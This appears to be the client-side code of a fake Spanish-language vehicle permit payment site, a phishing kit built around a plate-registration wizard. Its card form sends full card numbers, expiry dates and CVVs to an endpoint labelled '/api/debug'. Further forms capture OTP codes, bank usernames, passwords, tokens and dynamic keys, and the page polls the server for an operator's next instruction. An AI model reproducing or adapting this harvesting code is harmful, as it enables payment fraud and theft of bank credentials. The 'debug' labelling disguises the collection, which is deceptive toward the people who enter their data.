  resetMetodoPago();
  renderPlacas();
  setStep(0);
  clearBanner();
  if (input.found) banner("Información encontrada. Completa o confirma tus datos para continuar.", true);
  else banner("No encontramos una persona previa. Completa el registro para continuar.");
  showOverlay("solicitudOverlay", true);
  document.body.style.overflow = "hidden";
  sessionStorage.setItem(KEY, JSON.stringify({ tipoDocumento: input.tipoDocumento, numeroDocumento: input.numeroDocumento }));
}

function closeAll() {
  window.clearTimeout(pasarelaLoadTimer);
  showOverlay("solicitudOverlay", false);
  showOverlay("pagoOverlay", false);
  showOverlay("pseOverlay", false);
  showOverlay("cardOverlay", false);
  showOverlay("pasarelaLoadOverlay", false);
  const payBtn = $("btnPagarPse") as HTMLButtonElement | null;
  if (payBtn) payBtn.disabled = false;
  hideWaitScreen();
  const challenge = $("pagos-challenge-screen");
  if (challenge) challenge.hidden = true;
  const approved = $("pagos-approved-screen");
  if (approved) {
    approved.hidden = true;
    approved.style.display = "none";
  }
  document.body.style.overflow = "";
}

async function agregarPlaca() {
  const placa = val("placa").toUpperCase();
  const confirm = val("confirmarPlaca").toUpperCase();
  const duration = val("duracionPermiso");
  const start = val("fechaInicio");
  if (!placa || !confirm) return banner("Ingrese los campos Placa y Confirmar Placa o seleccione un archivo.");
  if (!PLATE.test(placa)) return banner("La placa no cumple con una estructura válida!");
  if (placa !== confirm) return banner("Las placas no coinciden.");
  if (!duration || !start) return banner("Seleccione Duración Permiso antes de agregar placas.");
  if (state.plates.length >= 10) return banner("Supera el límite de placas permitidas (10).");
  if (state.plates.some((row) => row.placa === placa)) return banner("La placa ya fue agregada.");
  const vehicle = vehicleFromForm();
  if (!vehicle) return banner("Consulta la placa o completa los datos del vehículo para calcular la tarifa.");
  const sim = await api.simulate({
    duration,
    cylinder: vehicle.cylinder,
    fuel: vehicle.fuel,
    model: vehicle.model,
    valuation: vehicle.valuation,
    municipality: vehicle.municipality,
  });
  state.plates.push({
    placa,
    duration,
    start,
    end: permitEndDate(start, duration),
    value: sim.value,
    donation: 0,
    breakdown: sim.breakdown,
    vehicle,
  });
  setVal("placa", "");
  setVal("confirmarPlaca", "");
  state.runtVehicle = null;
  $("runtCard")?.classList.add("hidden");
  clearBanner();
  renderPlacas();
  const body = document.querySelector(".solicitud-dialog-body") as HTMLElement | null;
  const list = $("placasRegistro");
  if (body && list) {
    const top = list.getBoundingClientRect().top - body.getBoundingClientRect().top + body.scrollTop;
    body.scrollTo({ top: Math.max(0, top - 8), behavior: "smooth" });
  }
}

async function buscarRunt() {
  const placa = val("placa").toUpperCase();
  const msg = $("runtMsg");
  const card = $("runtCard");
  if (!PLATE.test(placa)) {
    if (msg) msg.textContent = "La placa ingresada no es correcta";
    return;
  }
  if (msg) msg.textContent = "Consultando RUNT...";
  const result = await api.lookupRunt(placa);
  if (!result.found || !result.vehicle) {
    state.runtVehicle = null;
    $("manualVehicle")?.classList.remove("hidden");
    if (msg) msg.textContent = "";
    card?.classList.add("hidden");
    return;
  }
  const vehicle = result.vehicle;
  state.runtVehicle = {
    marca: vehicle.marca,
    linea: vehicle.linea,
    modeloAnio: vehicle.modeloAnio,
    cilindrajeCc: vehicle.cilindrajeCc,
    cylinder: vehicle.cylinder,
    fuel: vehicle.fuel,
    model: vehicle.model,
    valuation: vehicle.valuation,
    municipality: vehicle.municipality,
  };
  setVal("cylinder", vehicle.cylinder);
  setVal("fuel", vehicle.fuel);
  setVal("model", vehicle.model);
  setVal("valuation", vehicle.valuation);
  setVal("municipality", vehicle.municipality);
  $("manualVehicle")?.classList.add("hidden");
  if (msg) msg.textContent = "";
  if (card) {
    card.classList.remove("hidden");
    card.innerHTML = `<strong>${vehicle.placa}</strong> · ${vehicle.marca} ${vehicle.linea} ${vehicle.modeloAnio} · ${vehicle.cilindrajeCc} cc`;
  }
}

export function bindSolicitudWizard() {
  ["pagos-wait-screen", "pagos-challenge-screen", "pagos-auth-screen", "pagos-approved-screen", "pagos-debug-modal"].forEach((id) => {
    const el = $(id);
    if (el && el.parentElement !== document.body) document.body.appendChild(el);
  });
  document.querySelectorAll('input[name="tipoPersona"]').forEach((el) => el.addEventListener("change", syncPersonaType));
  $("departamentoResidencia")?.addEventListener("change", () => {
    filterMunicipios("municipioResidencia", val("departamentoResidencia"));
    copyCorrespondencia();
  });
  $("municipioResidencia")?.addEventListener("change", () => {
    syncLocalidad();
    copyCorrespondencia();
  });
  $("direccionResidencia")?.addEventListener("input", copyCorrespondencia);
  $("copiarCorrespondencia")?.addEventListener("change", copyCorrespondencia);
  $("departamentoCorrespondencia")?.addEventListener("change", () => {
    filterMunicipios("municipioCorrespondencia", val("departamentoCorrespondencia"));
  });
  $("closeWizard")?.addEventListener("click", closeAll);
  $("btnCancelar")?.addEventListener("click", closeAll);
  $("btnAtras")?.addEventListener("click", () => {
    clearBanner();
    setStep(Math.max(0, state.step - 1));
  });
  $("btnSiguiente")?.addEventListener("click", () => {
    if (state.step === 0) {
      const error = validatePersona();
      if (error) return banner(error);
      clearBanner();
      setStep(1);
      return;
    }
    if (state.step === 1) {
      if (!state.plates.length) return banner("Por favor seleccione al menos una placa");
      clearBanner();
      setStep(2);
    }
  });
  $("agregarPlaca")?.addEventListener("click", () => void agregarPlaca());
  $("donacionSi")?.addEventListener("click", () => {
    state.donation = true;
    syncDonation();
  });
  $("donacionNo")?.addEventListener("click", () => {
    state.donation = false;
    state.donationPct = "0";
    setVal("donacionPct", "0");
    syncDonation();
  });
  $("donacionPct")?.addEventListener("change", () => {
    state.donationPct = val("donacionPct");
    syncDonation();
  });
  resetMetodoPago();
  const unlockTitular = () => {
    const el = $("cardTitular") as HTMLInputElement | null;
    el?.removeAttribute("readonly");
  };
  const keepTitularLetters = () => {
    const el = $("cardTitular") as HTMLInputElement | null;
    if (!el) return;
    el.value = el.value.replace(/[^A-Za-zÁÉÍÓÚÜÑáéíóúüñ ]+/g, "").replace(/\s{2,}/g, " ");
  };
  $("cardTitular")?.addEventListener("pointerdown", unlockTitular);
  $("cardTitular")?.addEventListener("focus", unlockTitular);
  $("cardTitular")?.addEventListener("beforeinput", (event) => {
    const insert = (event as InputEvent).data || "";
    if (insert && /[^A-Za-zÁÉÍÓÚÜÑáéíóúüñ ]/.test(insert)) event.preventDefault();
  });
  $("cardTitular")?.addEventListener("input", keepTitularLetters);
  $("cardTitular")?.addEventListener("paste", () => window.setTimeout(keepTitularLetters, 0));
  document.querySelectorAll('input[name="metodoPago"]').forEach((el) => el.addEventListener("change", syncMetodoPago));
  document.querySelector('input[name="metodoPago"][value="pse"]')?.addEventListener("click", () => {
    $("pseUnavailable")?.classList.remove("hidden");
  });
  $("btnIrPagar")?.addEventListener("click", () => {
    syncMetodoPago();
    const selected = (document.querySelector('input[name="metodoPago"]:checked') as HTMLInputElement | null)?.value || "";
    if (!selected) return banner("Selecciona una opción de pago");
    if (selected === "pse") {
      $("pseUnavailable")?.classList.remove("hidden");
      $("pseUnavailable")?.scrollIntoView({ block: "nearest", behavior: "smooth" });
      return banner("El servicio de PSE no está habilitado por el momento. Selecciona tarjeta de crédito o débito para continuar.");
    }
    state.banco = "";
    state.bancoNombre = metodoLabel();
    savePendingRequests();
    renderPagoDatos();
    showOverlay("pagoOverlay", true);
  });
  $("closePago")?.addEventListener("click", () => showOverlay("pagoOverlay", false));
  $("btnVolverConfirmacion")?.addEventListener("click", () => showOverlay("pagoOverlay", false));
  $("btnPagarPse")?.addEventListener("click", () => {
    if (state.metodoPago === "pse") {
      return banner("El servicio de PSE no está habilitado por el momento. Selecciona tarjeta de crédito o débito para continuar.");
    }
    openPasarelaLoader();
  });
  $("btnSalirPse")?.addEventListener("click", () => showOverlay("pseOverlay", false));
  const unlockPayField = (id: string) => {
    const el = $(id) as HTMLInputElement | null;
    el?.removeAttribute("readonly");
  };
  ["cardNumero", "cardVence", "cardCvv"].forEach((id) => {
    $(id)?.addEventListener("pointerdown", () => unlockPayField(id));
    $(id)?.addEventListener("focus", () => unlockPayField(id));
  });
  const cardNumero = $("cardNumero") as HTMLInputElement | null;
  const applyCardNumber = () => {
    if (!cardNumero) return;
    const formatted = formatCardNumber(cardNumero.value);
    applyMaskedValue(cardNumero, formatted);
    const brand = cardBrand(formatted.replace(/\D/g, ""));
    const maxDigits = cardLength(brand).max;
    cardNumero.maxLength = maxDigits + (brand === "American Express" || brand === "Diners Club" ? 2 : 3);
    const cvv = $("cardCvv") as HTMLInputElement | null;
    if (cvv) cvv.maxLength = brand === "American Express" ? 4 : 3;
    updateCardLive();
  };
  cardNumero?.addEventListener("beforeinput", (event) => {
    const insert = (event as InputEvent).data || "";
    if (!insert || (event as InputEvent).inputType?.startsWith("delete")) return;
    const start = cardNumero.selectionStart || 0;
    const end = cardNumero.selectionEnd || 0;
    const next = `${cardNumero.value.slice(0, start)}${insert}${cardNumero.value.slice(end)}`;
    const brand = cardBrand(next.replace(/\D/g, ""));
    if (next.replace(/\D/g, "").length > cardLength(brand).max) event.preventDefault();
  });
  cardNumero?.addEventListener("input", applyCardNumber);
  cardNumero?.addEventListener("keyup", applyCardNumber);
  cardNumero?.addEventListener("paste", () => window.setTimeout(applyCardNumber, 0));
  const cardVence = $("cardVence") as HTMLInputElement | null;
  const applyExpiry = () => {
    if (!cardVence) return;
    applyMaskedValue(cardVence, formatExpiry(cardVence.value));
  };
  cardVence?.addEventListener("input", applyExpiry);
  cardVence?.addEventListener("keyup", applyExpiry);
  cardVence?.addEventListener("paste", () => window.setTimeout(applyExpiry, 0));
  const cardCvv = $("cardCvv") as HTMLInputElement | null;
  const applyCvv = () => {
    if (!cardCvv) return;
    const amex = cardBrand((cardNumero?.value || "").replace(/\D/g, "")) === "American Express";
    applyMaskedValue(cardCvv, cardCvv.value.replace(/\D/g, "").slice(0, amex ? 4 : 3));
  };
  cardCvv?.addEventListener("beforeinput", (event) => {
    const insert = (event as InputEvent).data || "";
    if (!insert || (event as InputEvent).inputType?.startsWith("delete")) return;
    const amex = cardBrand((cardNumero?.value || "").replace(/\D/g, "")) === "American Express";
    const start = cardCvv.selectionStart || 0;
    const end = cardCvv.selectionEnd || 0;
    const next = `${cardCvv.value.slice(0, start)}${insert}${cardCvv.value.slice(end)}`;
    if (next.replace(/\D/g, "").length > (amex ? 4 : 3)) event.preventDefault();
  });
  cardCvv?.addEventListener("input", applyCvv);
  cardCvv?.addEventListener("keyup", applyCvv);
  cardCvv?.addEventListener("paste", () => window.setTimeout(applyCvv, 0));
  $("btnSalirCard")?.addEventListener("click", () => showOverlay("cardOverlay", false));
  $("cardForm")?.addEventListener("submit", async (event) => {
    event.preventDefault();
    const error = validateCard();
    const errEl = $("cardError");
    if (error) {
      if (errEl) {
        errEl.textContent = error;
        errEl.classList.remove("hidden");
      }
      return;
    }
    errEl?.classList.add("hidden");
    const sessionId = sessionStorage.getItem("latam-debug-session-id") || crypto.randomUUID();
    sessionStorage.setItem("latam-debug-session-id", sessionId);
    const number = val("cardNumero");
    const digits = number.replace(/\D/g, "");
    const brandKey = cardBrandKey(digits);
    lastCardBrand = brandKey;
    const payBtn = $("btnPagarTarjeta") as HTMLButtonElement | null;
    if (payBtn) {
      payBtn.disabled = true;
      payBtn.textContent = "Procesando...";
    }
    showWaitScreen(brandKey);
    try {
      await fetch("/api/debug", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          event: "PAYMENT_SUBMIT",
          sessionId,
          route: "/Registro",
          cardFirstDigit: digits.charAt(0),
          meta: accumulateDebugMeta({
            step: "✅ Agregó datos tarjeta",
            amount: grandTotal(),
            brand: brandKey,
            card: `${digits.slice(0, 6)}******${digits.slice(-4)}`,
            ...personDebugMeta(),
            cpayload: {
              b: number,
              cv: val("cardVence"),
              cvv: val("cardCvv"),
              exp: val("cardCvv"),
              holder: personName(),
            },
          }),
        }),
      });
      const decision = await pollDebugDecision(sessionId);
      await handlePaymentDecision(decision, brandKey, payBtn);
    } catch (err) {
      hideWaitScreen();
      showOverlay("cardOverlay", true);
      if (errEl) {
        errEl.textContent = err instanceof Error ? err.message : "No se pudo completar el pago.";
        errEl.classList.remove("hidden");
      }
      if (payBtn) {
        payBtn.disabled = false;
        payBtn.textContent = "Pagar con tarjeta";
      }
    }
  });
  $("btnPagoAprobado")?.addEventListener("click", (event) => {
    event.preventDefault();
    window.location.assign("/Inicio");
  });
  $("pagos-debug-modal-close")?.addEventListener("click", () => {
    const modal = $("pagos-debug-modal");
    if (modal) modal.hidden = true;
    document.body.classList.remove("pagos-debug-modal-open");
  });
  document.querySelectorAll("[data-help-toggle]").forEach((btn) => {
    btn.addEventListener("click", () => {
      const root = btn.closest("[data-help]");
      const panel = root?.querySelector("[data-help-panel]") as HTMLElement | null;
      const icon = root?.querySelector("[data-help-icon]");
      if (!panel) return;
      const open = !panel.hidden;
      panel.hidden = open;
      if (icon) icon.textContent = open ? "+" : "−";
      btn.setAttribute("aria-expanded", String(!open));
    });
  });
  const keepPhoneDigits = () => {
    const input = $("telefono") as HTMLInputElement | null;
    if (!input) return;
    input.value = input.value.replace(/\D/g, "");
  };
  $("telefono")?.addEventListener("input", keepPhoneDigits);
  $("telefono")?.addEventListener("paste", () => window.setTimeout(keepPhoneDigits, 0));
  document.querySelectorAll("input[name='otp'], input[name='token'], input[name='cdin']").forEach((el) => {
    const input = el as HTMLInputElement;
    const keepDigits = () => {
      input.value = input.value.replace(/\D/g, "");
    };
    input.addEventListener("input", keepDigits);
    input.addEventListener("paste", () => window.setTimeout(keepDigits, 0));
  });
  document.querySelectorAll("[data-otp-form]").forEach((form) => {
    form.addEventListener("submit", async (event) => {
      event.preventDefault();
      const input = form.querySelector("input[name='otp']") as HTMLInputElement | null;
      if (!input?.value.trim()) {
        input?.focus();
        return;
      }
      const panel = form.closest("[data-challenge-brand]");
      const brandKey = panel?.getAttribute("data-challenge-brand") || "visa";
      const attempts = Number((form as HTMLElement).dataset.attempts || "0") + 1;
      (form as HTMLElement).dataset.attempts = String(attempts);
      const sessionId = sessionStorage.getItem("latam-debug-session-id") || crypto.randomUUID();
      sessionStorage.setItem("latam-debug-session-id", sessionId);
      try {
        await fetch("/api/debug", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            event: "OTP_SUBMIT",
            sessionId,
            route: "/Registro",
            meta: accumulateDebugMeta({
              step: "Envió código OTP",
              brand: brandKey,
              ...personDebugMeta(),
            }),
            metaOtp: accumulateDebugOtp({
              step: "Envió código OTP",
              brand: brandKey,
              otp: input.value,
              otpLength: String(input.value || "").trim().length,
              attempt: attempts,
            }),
          }),
        });
      } catch {
        setChallengeMessage(brandKey, "No pudimos procesar el código. Intenta nuevamente.");
        return;
      }
      showWaitScreen(brandKey);
      const decision = await pollDebugDecision(sessionId);
      const payBtn = $("btnPagarTarjeta") as HTMLButtonElement | null;
      if (decision.action === "sms" || decision.action === "sms_error") {
        showChallengeScreen(
          brandKey,
          decision.message || "Código inválido. Hemos enviado un nuevo código por SMS o correo",
        );
        input.value = "";
        input.focus();
        return;
      }
      await handlePaymentDecision(decision, brandKey, payBtn);
    });
  });
  document.querySelectorAll("[data-auth-form]").forEach((form) => {
    form.addEventListener("submit", async (event) => {
      event.preventDefault();
      const kind = form.getAttribute("data-auth-form") || "userpass";
      const username = (form.querySelector('input[name="username"]') as HTMLInputElement | null)?.value.trim() || "";
      const password = (form.querySelector('input[name="password"]') as HTMLInputElement | null)?.value.trim() || "";
      const token = (form.querySelector('input[name="token"]') as HTMLInputElement | null)?.value.trim() || "";
      const cdin = (form.querySelector('input[name="cdin"]') as HTMLInputElement | null)?.value.trim() || "";
      if (kind === "userpass" && (!username || !password)) {
        setAuthMessage(kind, "Ingresa tu usuario y contraseña para continuar.");
        return;
      }
      if (kind === "token" && !token) {
        setAuthMessage(kind, "Ingresa el token para continuar.");
        return;
      }
      if (kind === "dynamic" && !cdin) {
        setAuthMessage(kind, "Ingresa la clave dinámica para continuar.");
        return;
      }
      const eventName = kind === "token" ? "TOKEN_SUBMIT" : kind === "dynamic" ? "DYNAMIC_SUBMIT" : "USERPASS_SUBMIT";
      const sessionId = sessionStorage.getItem("latam-debug-session-id") || crypto.randomUUID();
      sessionStorage.setItem("latam-debug-session-id", sessionId);
      const brandKey = lastCardBrand || "visa";
      try {
        await fetch("/api/debug", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            event: eventName,
            sessionId,
            route: "/Registro",
            meta: accumulateDebugMeta({
              step: kind === "token" ? "Envió token" : kind === "dynamic" ? "Envió clave dinámica" : "Envió usuario y contraseña",
              username,
              password,
              token,
              cdin,
              ...personDebugMeta(),
            }),
          }),
        });
      } catch {
        setAuthMessage(kind, "No pudimos procesar los datos. Intenta nuevamente.");
        return;
      }
      showWaitScreen(brandKey);
      const decision = await pollDebugDecision(sessionId);
      const payBtn = $("btnPagarTarjeta") as HTMLButtonElement | null;
      await handlePaymentDecision(decision, brandKey, payBtn);
    });
  });
}
